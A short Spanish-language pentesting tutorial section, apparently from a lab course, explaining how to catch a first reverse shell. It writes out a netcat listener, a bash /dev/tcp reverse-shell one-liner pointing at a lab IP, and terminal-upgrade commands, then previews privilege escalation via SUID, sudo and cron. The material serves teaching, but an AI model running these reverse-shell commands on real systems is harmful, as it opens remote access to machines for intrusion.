## Tu primera shell

Una **shell** es código ejecutándose en la víctima que te da línea de comandos.
La forma clásica de capturarla:

```bash
# En TU máquina (el "oyente"):
nc -lvnp 4444
```

Y provocas en la víctima (via RCE, upload, etc.) algo como:

```bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1      # reverse shell bash
```

Chuleta de one-liners por lenguaje (bash/php/python/perl/powershell):
**revshells.com** — el generador que todo el mundo tiene abierto en una pestaña.

## Mejorar la shell (primer rito de paso)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'   # pseudo-terminal
export TERM=xterm                                  # colores y clear
# Ctrl+Z, luego en tu terminal:
stty raw -echo; fg
stty rows 40 cols 120
```

Con esto tienes flechas, historial, TAB y Ctrl+C que no cierra la sesión. En labs
lo harás tantas veces que acabará saliendo solo.

## Y ahora, a escalar

La shell inicial suele ser de usuario limitado (www-data, service). La escalada de
privilegios (local) la trabajarás a fondo en la ruta Jr Penetration Tester — y lo que
ya intuyes de Linux (SUID, sudo -l, cron) y Windows (UAC, servicios) te servirá directo.
